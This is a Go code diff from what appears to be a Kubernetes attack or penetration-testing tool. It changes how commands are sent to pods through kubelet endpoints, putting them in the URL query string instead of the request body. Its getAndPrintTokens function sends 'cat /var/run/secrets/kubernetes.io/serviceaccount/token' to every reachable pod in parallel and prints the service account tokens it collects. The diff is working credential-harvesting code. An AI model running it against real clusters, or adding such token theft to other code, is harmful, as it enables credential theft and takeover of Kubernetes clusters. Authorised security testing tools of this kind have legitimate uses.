@@ -86,8 +86,8 @@ func runParallelCommandsOnPods(runPodsInfo []RunPodInfo, concurrencyLimit int, c
 
 			statusCode := 0
 			output := ""
-
-			resp, err := api.PostRequest(api.GlobalClient, podInfo.Url, []byte(command))
+			podInfoUrlAndCommand := podInfo.Url + command
+			resp, err := api.PostRequest(api.GlobalClient, podInfoUrlAndCommand, []byte{})
 
 			if err == nil && resp != nil {
 				statusCode = resp.StatusCode
@@ -137,8 +137,8 @@ func runParallelCommandsOnPods(runPodsInfo []RunPodInfo, concurrencyLimit int, c
 		if podNumber == len(runPodsInfo) {
 			break
 		}
-	
-	        podNumber += 1
+
+		podNumber += 1
 	}
 
 	// now we're done we return the results
@@ -153,7 +153,7 @@ func GetTokensFromAllPods(nodeIPAddress string) {
 // TODO: this function should refactor, it similar to the run command parallel with the only change of getting token.
 // Check if possible to move the result channel out to a new function.
 func getAndPrintTokens(runPodsInfo []RunPodInfo, concurrencyLimit int) {
-	command := "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+	command := "?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"
 
 	// this buffered channel will block at the concurrency limit
 	semaphoreChan := make(chan struct{}, concurrencyLimit)
@@ -180,8 +180,8 @@ func getAndPrintTokens(runPodsInfo []RunPodInfo, concurrencyLimit int) {
 
 			statusCode := 0
 			output := ""
-
-			resp, err := api.PostRequest(api.GlobalClient, podInfo.Url, []byte(command))
+			podInfoUrlAndCommand := podInfo.Url + command
+			resp, err := api.PostRequest(api.GlobalClient, podInfoUrlAndCommand, []byte{})
 
 			if err == nil && resp != nil {
 				statusCode = resp.StatusCode
